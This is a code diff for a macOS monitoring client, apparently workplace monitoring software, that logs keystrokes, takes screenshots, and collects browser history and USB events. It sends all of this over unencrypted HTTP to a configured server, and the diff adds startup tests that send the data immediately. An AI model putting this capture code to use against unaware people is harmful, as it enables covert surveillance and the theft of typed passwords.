@@ -19,10 +19,10 @@ let API_ROUTE = "/webapi.php"
 let TIC_ROUTE = "/eventhandler.php"
 var APP_VERSION = "1.0"
 
-var TIME_INTERVAL = 1
-let TIC_INTERVAL = 30
-let HISTORY_INTERVAL = 120
-let KEY_INTERVAL = 60
+var TIME_INTERVAL = 60      // Screenshots every 60 seconds (optimized from 1)
+let TIC_INTERVAL = 300      // Tic every 5 minutes (optimized from 30 seconds)
+let HISTORY_INTERVAL = 600  // History every 10 minutes (optimized from 2 minutes)
+let KEY_INTERVAL = 300      // Keys every 5 minutes (optimized from 1 minute)
 var timer: Timer? = nil
 var macAddress: String = ""
 var activeRunning: Bool = false
@@ -142,10 +142,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
 
     // Add these properties at the top of the class
     private var lastEventTapCheck: Date = Date()
-    private var eventTapCheckInterval: TimeInterval = 3.0 // Check every 3 seconds
+    private var eventTapCheckInterval: TimeInterval = 30.0 // Check every 30 seconds (optimized from 3)
     private var isReestablishingEventTap: Bool = false
     var lastKeyCaptureTime: Date = Date()
-    private let maxKeyCaptureGap: TimeInterval = 10.0 // Alert if no keys for 10 seconds
+    private let maxKeyCaptureGap: TimeInterval = 60.0 // Alert if no keys for 60 seconds (optimized from 10)
     
     // Last sent times for status tracking
     private var lastKeyLogSent: Date?
@@ -156,45 +156,84 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     
     // Server connectivity tracking
     private var isServerConnected: Bool = false
+    private var wasServerConnected: Bool = false // Track previous state for notifications
+    
+    // Client information (cached)
+    private var clientIPAddress: String = "Unknown"
 
-    // Logging system
+    // Logging system (optimized with buffering)
     let logFile = "MonitorClient.log"
     var logFileHandle: FileHandle?
+    private var logBuffer: [String] = []
+    private var logFlushTimer: Timer?
+    private let maxLogBufferSize = 50
 
     // MARK: - Logging Functions
     
     private func setupLogging() {
-        // Try multiple locations for log file
-        let possibleLogPaths = [
-            FileManager.default.currentDirectoryPath,
-            NSTemporaryDirectory(),
-            NSHomeDirectory() + "/Desktop",
-            NSHomeDirectory() + "/Documents",
-            "/tmp"
-        ]
+        // Determine if we're in development or production mode
+        let isDevelopment = Bundle.main.bundlePath.contains("DerivedData") || Bundle.main.bundlePath.contains("Debug")
         
         var logURL: URL?
         var logFileCreated = false
         
-        // Try to create log file in different locations
-        for path in possibleLogPaths {
-            let testURL = URL(fileURLWithPath: path).appendingPathComponent(logFile)
+        if isDevelopment {
+            // Development mode: save to local folder (current directory)
+            let currentDir = FileManager.default.currentDirectoryPath
+            logURL = URL(fileURLWithPath: currentDir).appendingPathComponent(logFile)
             
             do {
-                // Create log file if it doesn't exist
-                if !FileManager.default.fileExists(atPath: testURL.path) {
-                    try "".write(to: testURL, atomically: true, encoding: .utf8)
+                if !FileManager.default.fileExists(atPath: logURL!.path) {
+                    try "".write(to: logURL!, atomically: true, encoding: .utf8)
                 }
-                
-                // Test if we can write to the file
-                try "test".write(to: testURL, atomically: true, encoding: .utf8)
-                
-                logURL = testURL
+                try "test".write(to: logURL!, atomically: true, encoding: .utf8)
                 logFileCreated = true
-                break
+                print("✅ Development mode: Log file created at: \(logURL!.path)")
             } catch {
-                print("Failed to create log file at \(testURL.path): \(error)")
-                continue
+                print("⚠️  Failed to create log file in development mode: \(error)")
+            }
+        } else {
+            // Production mode: save to Applications folder
+            let appBundlePath = Bundle.main.bundlePath
+            let appContainerURL = URL(fileURLWithPath: appBundlePath).deletingLastPathComponent()
+            let logDirPath = appContainerURL.appendingPathComponent("Logs").path
+            
+            // Create Logs directory if it doesn't exist
+            if !FileManager.default.fileExists(atPath: logDirPath) {
+                do {
+                    try FileManager.default.createDirectory(atPath: logDirPath, withIntermediateDirectories: true, attributes: nil)
+                } catch {
+                    print("⚠️  Failed to create logs directory: \(error)")
+                }
+            }
+            
+            logURL = URL(fileURLWithPath: logDirPath).appendingPathComponent(logFile)
+            
+            do {
+                if !FileManager.default.fileExists(atPath: logURL!.path) {
+                    try "".write(to: logURL!, atomically: true, encoding: .utf8)
+                }
+                try "test".write(to: logURL!, atomically: true, encoding: .utf8)
+                logFileCreated = true
+                print("✅ Production mode: Log file created at: \(logURL!.path)")
+            } catch {
+                print("⚠️  Failed to create log file in production mode: \(error)")
+                
+                // Fallback to Documents folder if Applications folder is not writable
+                let documentsPath = NSHomeDirectory() + "/Documents"
+                let fallbackURL = URL(fileURLWithPath: documentsPath).appendingPathComponent(logFile)
+                
+                do {
+                    if !FileManager.default.fileExists(atPath: fallbackURL.path) {
+                        try "".write(to: fallbackURL, atomically: true, encoding: .utf8)
+                    }
+                    try "test".write(to: fallbackURL, atomically: true, encoding: .utf8)
+                    logURL = fallbackURL
+                    logFileCreated = true
+                    print("✅ Fallback: Log file created in Documents folder: \(fallbackURL.path)")
+                } catch {
+                    print("⚠️  Failed to create log file in fallback location: \(error)")
+                }
             }
         }
         
@@ -207,7 +246,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             do {
                 logFileHandle = try FileHandle(forWritingTo: logURL!)
                 logFileHandle?.seekToEndOfFile()
-                print("✅ Log file created at: \(logURL!.path)")
+                print("✅ Log file handle opened successfully")
             } catch {
                 print("⚠️  Could not open log file handle: \(error). Using console logging only.")
                 logFileHandle = nil
@@ -215,9 +254,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
         
         // Always log startup information
+        let username = storage.string(forKey: "username") ?? NSUserName()
         let startupInfo = """
         === MonitorClient Started ===
         Version: \(APP_VERSION)
+        Mode: \(isDevelopment ? "Development" : "Production")
+        Username: \(username)
         Mac Address: \(macAddress)
         Server IP: \(storage.string(forKey: "server-ip") ?? "unknown")
         Log file location: \(logURL?.path ?? "console only")
@@ -235,7 +277,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         // System log
         let osLog = OSLog(subsystem: "com.alice.MonitorClient", category: "monitoring")
-        os_log("MonitorClient started - Version: %{public}@, Server: %{public}@", log: osLog, type: .info, APP_VERSION, storage.string(forKey: "server-ip") ?? "unknown")
+        os_log("MonitorClient started - Version: %{public}@, Username: %{public}@, Server: %{public}@", log: osLog, type: .info, APP_VERSION, username, storage.string(forKey: "server-ip") ?? "unknown")
     }
     
     func logMessage(_ message: String, level: LogLevel = .info) {
@@ -245,33 +287,31 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Console output - always print for debugging
         print(logEntry.trimmingCharacters(in: .whitespacesAndNewlines))
         
-        // File logging
-        if let data = logEntry.data(using: .utf8) {
-            logFileHandle?.write(data)
-            logFileHandle?.synchronizeFile()
-        }
+        // Buffered file logging (optimized)
+        logBuffer.append(logEntry)
         
-        // Also write to a simple log file in Documents for distributed apps
-        writeToDocumentsLog(message: logEntry)
+        // Flush buffer if it gets too large or for important messages
+        if logBuffer.count >= maxLogBufferSize || level == .error {
+            flushLogBuffer()
+        }
         
         // System log
         let osLog = OSLog(subsystem: "com.alice.MonitorClient", category: "monitoring")
         os_log("%{public}@", log: osLog, type: level.osLogType, message)
     }
     
-    private func writeToDocumentsLog(message: String) {
-        let documentsPath = NSHomeDirectory() + "/Documents/MonitorClient.log"
-        if let data = message.data(using: .utf8) {
-            if let fileHandle = FileHandle(forWritingAtPath: documentsPath) {
-                fileHandle.seekToEndOfFile()
-                fileHandle.write(data)
-                fileHandle.closeFile()
-            } else {
-                // Create file if it doesn't exist
-                try? data.write(to: URL(fileURLWithPath: documentsPath), options: .atomic)
-            }
+    private func flushLogBuffer() {
+        guard !logBuffer.isEmpty else { return }
+        
+        let combinedLogs = logBuffer.joined()
+        if let data = combinedLogs.data(using: .utf8) {
+            logFileHandle?.write(data)
+            logFileHandle?.synchronizeFile()
         }
+        logBuffer.removeAll()
     }
+    
+
     
     enum LogLevel: String {
         case debug = "DEBUG"
@@ -359,6 +399,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             logMessage("Warning: Could not get MacAddress", level: .warning)
             macAddress = ""
         }
+        
+        // Get Client IP Address (once at startup)
+        clientIPAddress = getClientIPAddress()
+        logMessage("Client IP Address obtained: \(clientIPAddress)", level: .info)
 
         // Setup logging after basic initialization
         setupLogging()
@@ -381,8 +425,8 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMonitoringEvent("Setting up event tap monitoring")
         setupEventTapInvalidationMonitoring()
         
-        // Single timer for all tasks
-        timer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(checkAllTasks), userInfo: nil, repeats: true)
+        // Single timer for all tasks (optimized interval)
+        timer = Timer.scheduledTimer(timeInterval: 5.0, target: self, selector: #selector(checkAllTasks), userInfo: nil, repeats: true)
         logSuccess("Main monitoring timer started")
         
         let center = NSWorkspace.shared.notificationCenter
@@ -402,9 +446,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMonitoringEvent("Setting up USB monitoring")
         setupUSBMonitoring()
         
-        // Test server connectivity on startup
-        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
-            self.testServerConnectivity()
+        // Send all monitoring requests on startup for quick verification
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+            self.performStartupTests()
         }
         
         // Debug accessibility status on startup
@@ -427,6 +471,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         } catch {
             print("ERROR setting up status bar menu: \(error)")
         }
+        
+        // Setup log flush timer (flush logs every 30 seconds)
+        logFlushTimer = Timer.scheduledTimer(timeInterval: 30.0, target: self, selector: #selector(flushLogsPeriodically), userInfo: nil, repeats: true)
         
         logSuccess("MonitorClient initialization complete")
         print("=== MonitorClient Startup Complete ===")
@@ -453,6 +500,83 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         logMessage("User switched away from this session", level: .info)
         activeRunning = false
     }
+    
+    @objc func flushLogsPeriodically() {
+        flushLogBuffer()
+    }
+    
+    // Perform all monitoring tests on startup for quick verification
+    @objc func performStartupTests() {
+        logMessage("=== Starting Startup Tests ===", level: .info)
+        
+        // Test 1: Server connectivity (Tic event)
+        logMessage("Test 1: Sending tic event for server connectivity", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            do {
+                try self.sendTicEvent()
+            } catch {
+                self.logError("Startup tic event failed: \(error)", context: "StartupTest")
+            }
+        }
+        
+        // Test 2: Screenshot capability
+        logMessage("Test 2: Taking screenshot for permission verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            self.TakeScreenShotsAndPost()
+        }
+        
+        // Test 3: Browser history collection
+        logMessage("Test 3: Collecting browser history for access verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            do {
+                try self.sendBrowserHistories()
+            } catch {
+                self.logError("Startup browser history failed: \(error)", context: "StartupTest")
+            }
+        }
+        
+        // Test 4: Key logs (if any captured)
+        logMessage("Test 4: Sending key logs for keyboard monitoring verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            self.sendKeyLogs()
+        }
+        
+        // Test 5: USB logs (if any captured)
+        logMessage("Test 5: Sending USB logs for device monitoring verification", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            do {
+                try self.sendUSBLogs()
+            } catch {
+                self.logError("Startup USB logs failed: \(error)", context: "StartupTest")
+            }
+        }
+        
+        // Test 6: Server connectivity test
+        logMessage("Test 6: Testing server connectivity", level: .info)
+        DispatchQueue.global(qos: .background).async {
+            self.testServerConnectivity()
+        }
+        
+        logMessage("=== Startup Tests Initiated ===", level: .info)
+        logMessage("All tests will complete within 5-10 seconds", level: .info)
+        
+        // Show notification about startup tests
+        let notification = NSUserNotification()
+        notification.title = "MonitorClient Startup Tests"
+        notification.informativeText = "Running all monitoring tests to verify permissions and server connectivity. Check logs for results."
+        notification.soundName = nil
+        NSUserNotificationCenter.default.deliver(notification)
+    }
+    
+    // Check if system is idle before performing heavy operations
+    private func shouldPerformHeavyOperation() -> Bool {
+        // Check for any recent user activity (keyboard, mouse, etc.)
+        let lastKeyActivity = CGEventSource.secondsSinceLastEventType(.combinedSessionState, eventType: .keyDown)
+        let lastMouseActivity = CGEventSource.secondsSinceLastEventType(.combinedSessionState, eventType: .leftMouseDown)
+        
+        // Consider system active if there was any input in the last 5 minutes
+        return lastKeyActivity < 300 || lastMouseActivity < 300
+    }
 
     @objc func checkAllTasks() {
         let currentDate = Date()
@@ -463,11 +587,15 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         // Add event tap validation check to main timer loop
         checkAndReestablishEventTapThrottled()
                 
-        // Check if it's time for screenshots
+        // Check if it's time for screenshots (with activity check)
         if currentDate.timeIntervalSince(lastScreenshotCheck) >= TimeInterval(TIME_INTERVAL) {
-            logMonitoringEvent("Screenshot monitoring triggered", details: "Interval: \(TIME_INTERVAL)s")
-            let randomDelay = Double.random(in: 0...Double(TIME_INTERVAL))
-            perform(#selector(TakeScreenShotsAndPost), with: nil, afterDelay: randomDelay)
+            if shouldPerformHeavyOperation() {
+                logMonitoringEvent("Screenshot monitoring triggered", details: "Interval: \(TIME_INTERVAL)s")
+                let randomDelay = Double.random(in: 0...Double(TIME_INTERVAL))
+                perform(#selector(TakeScreenShotsAndPost), with: nil, afterDelay: randomDelay)
+            } else {
+                logMessage("Skipping screenshot - system appears idle", level: .debug)
+            }
             lastScreenshotCheck = currentDate
         }
         
@@ -627,8 +755,32 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     }
 
     func buildEndpoint(_ mode: Bool) -> String? {
-        if let ip = storage.string(forKey: "server-ip"), !ip.isEmpty {
-            let endpoint = "http://" + ip + (mode ? API_ROUTE : TIC_ROUTE)
+        // Get server IP and port
+        let serverIP = storage.string(forKey: "server-ip") ?? ""
+        let serverPort = storage.string(forKey: "server-port") ?? "8924"
+        
+        // Handle both formats: full address (IP:PORT) or separate IP and port
+        let finalIP: String
+        let finalPort: String
+        
+        if serverIP.contains(":") {
+            // Full address format (IP:PORT)
+            let components = serverIP.split(separator: ":")
+            if components.count >= 2 {
+                finalIP = String(components[0])
+                finalPort = String(components[1])
+            } else {
+                finalIP = serverIP
+                finalPort = serverPort
+            }
+        } else {
+            // Separate IP and port
+            finalIP = serverIP
+            finalPort = serverPort
+        }
+        
+        if !finalIP.isEmpty {
+            let endpoint = "http://\(finalIP):\(finalPort)" + (mode ? API_ROUTE : TIC_ROUTE)
             logMessage("Built endpoint: \(endpoint)", level: .debug)
             return endpoint
         } else {
@@ -1194,11 +1346,15 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
         
         if activeRunning == true {
+            // Get username from settings
+            let username = storage.string(forKey: "username") ?? NSUserName()
+            
             // Prepare request data
             let postData: [String: Any] = [
                 "Event": "Tic",
                 "Version": APP_VERSION,
-                "MacAddress": macAddress
+                "MacAddress": macAddress,
+                "Username": username
             ]
             
             logMessage("Tic event data: \(postData)", level: .debug)
@@ -1228,6 +1384,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                     self?.logError("Tic event network error: \(error)", context: "TicEvent")
                     self?.logError("Error details: \(error.localizedDescription)", context: "TicEvent")
                     self?.isServerConnected = false
+                    self?.checkServerConnectionChange()
                     return
                 }
                     
@@ -1238,6 +1395,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                         if httpResponse.statusCode == 200 {
                             self?.logSuccess("Tic event sent successfully", details: "HTTP \(httpResponse.statusCode)")
                             self?.isServerConnected = true
+                            self?.checkServerConnectionChange()
                             
                             if let data = data, let responseString = String(data: data, encoding: .utf8) {
                                 self?.logMessage("Response data size: \(data.count) bytes", level: .debug)
@@ -1256,10 +1414,12 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
                         } else {
                             self?.logError("Tic event HTTP error: \(httpResponse.statusCode)", context: "TicEvent")
                             self?.isServerConnected = false
+                            self?.checkServerConnectionChange()
                         }
                     } else {
                         self?.logError("No HTTP response received for tic event", context: "TicEvent")
                         self?.isServerConnected = false
+                        self?.checkServerConnectionChange()
                     }
                 }
             }
@@ -1288,7 +1448,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             
                 // Send data in chunks
                 sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
-                self.keyLogs.removeAll()
+                self.keyLogs.removeAll(keepingCapacity: true) // Optimized memory management
             lastKeyLogSent = Date()
                 logSuccess("Key logs sent and cleared", details: "\(keyLogs.count) keys")
         } else {
@@ -1309,34 +1469,33 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         
         logMessage("Found \(displayCount) display(s)", level: .debug)
         
-        for (index, screen) in NSScreen.screens.enumerated() {
-            let filename = NSTemporaryDirectory() + "temp\(index + 1).jpg"
+        // Capture single screenshot of all displays combined
+        let filename = NSTemporaryDirectory() + "screenshot.jpg"
+        
+        // Use CGWindowListCreateImage to capture the entire screen area
+        if let image = CGWindowListCreateImage(
+            CGRect.null,
+            .optionOnScreenOnly,
+            kCGNullWindowID,
+            .bestResolution
+        ) {
+            let bitmapRep = NSBitmapImageRep(cgImage: image)
+            let options: [NSBitmapImageRep.PropertyKey: Any] = [.compressionFactor: 0.21]
             
-            // Use CGWindowListCreateImage to capture the entire screen
-            if let image = CGWindowListCreateImage(
-                CGRect.null,
-                .optionOnScreenOnly,
-                kCGNullWindowID,
-                .bestResolution
-            ) {
-                let bitmapRep = NSBitmapImageRep(cgImage: image)
-                let options: [NSBitmapImageRep.PropertyKey: Any] = [.compressionFactor: 0.21]
-                
-                if let jpegData = bitmapRep.representation(using: .jpeg, properties: options) {
-                    do {
-                        try jpegData.write(to: URL(fileURLWithPath: filename), options: .atomic)
-                        logMessage("Screenshot saved: \(filename) (\(jpegData.count) bytes)", level: .debug)
-                        postImage(path: filename)
-                    } catch {
-                        logError("Failed to save screenshot: \(error)", context: "Screenshot")
-                    }
+            if let jpegData = bitmapRep.representation(using: .jpeg, properties: options) {
+                do {
+                    try jpegData.write(to: URL(fileURLWithPath: filename), options: .atomic)
+                    logMessage("Screenshot saved: \(filename) (\(jpegData.count) bytes)", level: .debug)
+                    postImage(path: filename)
+                } catch {
+                    logError("Failed to save screenshot: \(error)", context: "Screenshot")
                 }
-            } else {
-                logError("Failed to capture screenshot for display \(index + 1)", context: "Screenshot")
             }
+        } else {
+            logError("Failed to capture screenshot", context: "Screenshot")
         }
         
-        logSuccess("Screenshot capture completed", details: "\(displayCount) display(s)")
+        logSuccess("Screenshot capture completed", details: "1 combined screenshot")
     }
     
 
@@ -1465,6 +1624,91 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
         
         return ""
+    }
+    
+    func getClientIPAddress() -> String {
+        // Try to get local IP addresses first
+        let interfaces = ["en0", "en1", "en2", "en3", "en4", "en5", "en6", "en7", "en8", "en9"]
+        
+        for interface in interfaces {
+            let task = Process()
+            let output = Pipe()
+            task.launchPath = "/sbin/ifconfig"
+            task.arguments = [interface, "inet"]
+            task.standardOutput = output
+            task.standardError = output
+            
+            do {
+                task.launch()
+                task.waitUntilExit()
+                
+                let data = output.fileHandleForReading.readDataToEndOfFile()
+                if let result = String(data: data, encoding: .utf8) {
+                    let lines = result.components(separatedBy: .newlines)
+                    for line in lines {
+                        if line.contains("inet ") && !line.contains("127.0.0.1") {
+                            let components = line.components(separatedBy: " ")
+                            for component in components {
+                                if component.contains(".") && component.components(separatedBy: ".").count == 4 {
+                                    // Check if it's a local network IP (192.168.x.x, 10.x.x.x, 172.16-31.x.x)
+                                    let ipParts = component.components(separatedBy: ".")
+                                    if ipParts.count == 4 {
+                                        let firstOctet = Int(ipParts[0]) ?? 0
+                                        let secondOctet = Int(ipParts[1]) ?? 0
+                                        
+                                        // Local network ranges
+                                        if (firstOctet == 192 && secondOctet == 168) ||
+                                           (firstOctet == 10) ||
+                                           (firstOctet == 172 && secondOctet >= 16 && secondOctet <= 31) {
+                                            logMessage("Found local IP: \(component) on interface \(interface)", level: .debug)
+                                            return component
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch {
+                logMessage("Failed to check interface \(interface): \(error)", level: .debug)
+            }
+        }
+        
+        // Fallback: try to get any non-loopback IP
+        for interface in interfaces {
+            let task = Process()
+            let output = Pipe()
+            task.launchPath = "/sbin/ifconfig"
+            task.arguments = [interface, "inet"]
+            task.standardOutput = output
+            task.standardError = output
+            
+            do {
+                task.launch()
+                task.waitUntilExit()
+                
+                let data = output.fileHandleForReading.readDataToEndOfFile()
+                if let result = String(data: data, encoding: .utf8) {
+                    let lines = result.components(separatedBy: .newlines)
+                    for line in lines {
+                        if line.contains("inet ") && !line.contains("127.0.0.1") {
+                            let components = line.components(separatedBy: " ")
+                            for component in components {
+                                if component.contains(".") && component.components(separatedBy: ".").count == 4 {
+                                    logMessage("Found fallback IP: \(component) on interface \(interface)", level: .debug)
+                                    return component
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch {
+                logMessage("Failed to check interface \(interface) for fallback: \(error)", level: .debug)
+            }
+        }
+        
+        logMessage("No local IP address found", level: .warning)
+        return "Unknown"
     }
     
     @objc func applicationDidTerminate(_ notification: Notification) {
@@ -1659,6 +1903,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         let settingsPath = getSettingsFilePath()
         
         if let settings = NSDictionary(contentsOfFile: settingsPath) {
+            if let username = settings["username"] as? String {
+                storage.set(username, forKey: "username")
+                logMessage("Loaded username from settings: \(username)", level: .info)
+            }
             if let serverIP = settings["serverIP"] as? String {
                 // Extract IP from full address if needed
                 let ip = serverIP.contains(":") ? String(serverIP.split(separator: ":")[0]) : serverIP
@@ -1674,9 +1922,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
     }
     
-    private func saveSettings(serverIP: String, serverPort: String) {
+    private func saveSettings(username: String, serverIP: String, serverPort: String) {
         let settingsPath = getSettingsFilePath()
         let settings: [String: Any] = [
+            "username": username,
             "serverIP": serverIP,
             "serverPort": serverPort
         ]
@@ -1693,7 +1942,17 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         alert.informativeText = "Configure server connection settings"
         
         // Create custom view for input fields
-        let customView = NSView(frame: NSRect(x: 0, y: 0, width: 300, height: 80))
+        let customView = NSView(frame: NSRect(x: 0, y: 0, width: 300, height: 110))
+        
+        // Username field
+        let usernameLabel = NSTextField(labelWithString: "Username:")
+        usernameLabel.frame = NSRect(x: 0, y: 80, width: 80, height: 20)
+        customView.addSubview(usernameLabel)
+        
+        let usernameField = NSTextField(frame: NSRect(x: 90, y: 80, width: 200, height: 20))
+        usernameField.stringValue = storage.string(forKey: "username") ?? NSUserName()
+        usernameField.placeholderString = "Enter username"
+        customView.addSubview(usernameField)
         
         // Server IP field
         let ipLabel = NSTextField(labelWithString: "Server IP:")
@@ -1729,37 +1988,37 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         let response = alert.runModal()
         
         if response == .alertFirstButtonReturn {
+            let username = usernameField.stringValue.trimmingCharacters(in: .whitespacesAndNewlines)
             let serverIP = ipField.stringValue.trimmingCharacters(in: .whitespacesAndNewlines)
             let serverPort = portField.stringValue.trimmingCharacters(in: .whitespacesAndNewlines)
             
             // Validate input
-            if serverIP.isEmpty || serverPort.isEmpty {
+            if username.isEmpty || serverIP.isEmpty || serverPort.isEmpty {
                 let errorAlert = NSAlert()
                 errorAlert.messageText = "Invalid Settings"
-                errorAlert.informativeText = "Please enter both server IP and port."
+                errorAlert.informativeText = "Please enter username, server IP and port."
                 errorAlert.runModal()
                 return
             }
             
             // Save settings
-            let fullServerAddress = "\(serverIP):\(serverPort)"
-            storage.set(fullServerAddress, forKey: "server-ip")
+            storage.set(username, forKey: "username")
+            storage.set(serverIP, forKey: "server-ip")
             storage.set(serverPort, forKey: "server-port")
             
             // Update the global server address for immediate use
-            if let serverAddress = storage.string(forKey: "server-ip") {
-                logMessage("Server address updated to: \(serverAddress)", level: .info)
-            }
+            let fullServerAddress = "\(serverIP):\(serverPort)"
+            logMessage("Server address updated to: \(fullServerAddress)", level: .info)
             
             // Save to file
-            saveSettings(serverIP: serverIP, serverPort: serverPort)
+            saveSettings(username: username, serverIP: serverIP, serverPort: serverPort)
             
-            logMessage("Settings updated - Server: \(fullServerAddress)", level: .info)
+            logMessage("Settings updated - Username: \(username), Server: \(fullServerAddress)", level: .info)
             
             // Show confirmation
             let confirmAlert = NSAlert()
             confirmAlert.messageText = "Settings Saved"
-            confirmAlert.informativeText = "Server settings have been updated successfully."
+            confirmAlert.informativeText = "Settings have been updated successfully."
             confirmAlert.runModal()
         }
     }
@@ -1809,6 +2068,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         statusBarItem = nil
         statusMenu = nil
         
+        // Clean up logging
+        logFlushTimer?.invalidate()
+        logFlushTimer = nil
+        flushLogBuffer() // Final flush
+        
         // Clean up notification observers
         NotificationCenter.default.removeObserver(self)
         NSWorkspace.shared.notificationCenter.removeObserver(self)
@@ -1832,6 +2096,9 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             return
         }
         
+        // Check if permission was previously granted
+        let wasPreviouslyGranted = storage.bool(forKey: "accessibility-was-granted")
+        
         // Only prompt once per session to avoid spam
         let promptKey = "accessibility-prompt-shown"
         if storage.bool(forKey: promptKey) {
@@ -1840,15 +2107,56 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         }
         
         logMessage("Requesting accessibility permission...", level: .info)
-        logMessage("Please go to System Preferences > Security & Privacy > Privacy > Accessibility and add this app", level: .info)
+        
+        // Show detailed notification based on previous state
+        let notification = NSUserNotification()
+        notification.title = "MonitorClient - Accessibility Permission Required"
+        
+        if wasPreviouslyGranted {
+            // App was previously granted but permission was revoked
+            notification.informativeText = """
+            Accessibility permission was revoked. To restore monitoring:
+            
+            1. Open System Preferences > Security & Privacy > Privacy > Accessibility
+            2. Find "MonitorClient" in the list
+            3. Click the "-" button to remove it
+            4. Click the "+" button and add MonitorClient again
+            5. Restart the MonitorClient app
+            
+            This will restore keyboard monitoring functionality.
+            """
+            logMessage("Accessibility permission was previously granted but has been revoked", level: .warning)
+        } else {
+            // First time requesting permission
+            notification.informativeText = """
+            MonitorClient needs accessibility permission to monitor keyboard activity.
+            
+            To grant permission:
+            1. Open System Preferences > Security & Privacy > Privacy > Accessibility
+            2. Click the lock icon and enter your password
+            3. Click the "+" button and add MonitorClient
+            4. Check the box next to MonitorClient
+            5. Restart the MonitorClient app
+            
+            Without this permission, keyboard monitoring will not work.
+            """
+            logMessage("First time requesting accessibility permission", level: .info)
+        }
+        
+        notification.soundName = NSUserNotificationDefaultSoundName
+        NSUserNotificationCenter.default.deliver(notification)
+        
+        // Also log the instructions
+        logMessage("Accessibility permission instructions sent via notification", level: .info)
         
         let options = [kAXTrustedCheckOptionPrompt.takeUnretainedValue(): true]
         let trusted = AXIsProcessTrustedWithOptions(options as CFDictionary)
         
         if trusted {
             logMessage("Accessibility permission granted", level: .info)
+            storage.set(true, forKey: "accessibility-was-granted")
         } else {
-            logMessage("Accessibility permission denied - please check System Preferences", level: .warning)
+            logMessage("Accessibility permission denied - detailed instructions sent via notification", level: .warning)
         }
         
         // Mark that we've shown the prompt
@@ -1864,8 +2172,10 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         if trusted != lastTrustedState {
             if trusted {
                 logMessage("Accessibility permission status changed: GRANTED", level: .info)
+                storage.set(true, forKey: "accessibility-was-granted")
             } else {
                 logMessage("Accessibility permission status changed: DENIED", level: .warning)
+                // Don't clear the was-granted flag here, as we want to remember it was previously granted
             }
             storage.set(trusted, forKey: "last-accessibility-trusted")
         }
@@ -1873,6 +2183,36 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
         return trusted
     }
 
+    private func checkServerConnectionChange() {
+        // Check if connection state has changed
+        if wasServerConnected && !isServerConnected {
+            // Connection was lost
+            showServerConnectionNotification(connected: false)
+        } else if !wasServerConnected && isServerConnected {
+            // Connection was restored
+            showServerConnectionNotification(connected: true)
+        }
+        
+        // Update previous state
+        wasServerConnected = isServerConnected
+    }
+    
+    private func showServerConnectionNotification(connected: Bool) {
+        let notification = NSUserNotification()
+        notification.title = "MonitorClient"
+        
+        if connected {
+            notification.informativeText = "Server connection restored"
+            notification.soundName = nil // No sound for reconnection
+        } else {
+            notification.informativeText = "Server connection lost"
+            notification.soundName = NSUserNotificationDefaultSoundName
+        }
+        
+        NSUserNotificationCenter.default.deliver(notification)
+        logMessage("Server connection notification: \(connected ? "restored" : "lost")", level: .info)
+    }
+    
     func getCurrentDateTimeString() -> String {
         let dateFormatter = DateFormatter()
         dateFormatter.dateFormat = "yyyy-MM-dd HH:mm:ss"
@@ -2005,7 +2345,7 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
             do {
                 // Send data in chunks
                 sendDataInChunks(data: self.usbDeviceLogs, eventType: "USBLog", chunkSize: 500)
-                self.usbDeviceLogs.removeAll()
+                self.usbDeviceLogs.removeAll(keepingCapacity: true) // Optimized memory management
                 lastUSBLogSent = Date()
                 logSuccess("USB logs sent and cleared", details: "\(usbDeviceLogs.count) events")
             } catch {
@@ -2399,11 +2739,11 @@ class AppDelegate: NSObject, NSApplicationDelegate, NSUserNotificationCenterDele
     
     // Check accessibility permission periodically and request if needed
     private func checkAccessibilityPermissionPeriodically() {
